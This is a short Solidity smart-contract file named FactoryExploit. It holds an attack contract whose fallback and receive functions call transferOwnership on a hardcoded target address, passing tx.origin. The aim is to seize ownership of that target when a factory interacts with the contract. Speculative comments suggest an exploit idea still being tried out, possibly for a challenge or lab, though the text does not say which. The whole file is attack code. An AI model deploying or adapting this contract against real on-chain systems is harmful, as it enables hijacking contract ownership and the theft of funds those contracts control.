// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract FactoryExploit {
    // What if we deploy a contract that the factory will interact with?
    // And through that interaction, we can make it transfer ownership?
    
    address public target;
    
    constructor() {
        target = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    }
    
    // If the factory calls us, we execute transferOwnership
    fallback() external {
        (bool success,) = target.call(
            abi.encodeWithSignature("transferOwnership(address)", tx.origin)
        );
        require(success, "Transfer failed");
    }
    
    receive() external payable {
        (bool success,) = target.call(
            abi.encodeWithSignature("transferOwnership(address)", tx.origin)
        );
        require(success, "Transfer failed");
    }
}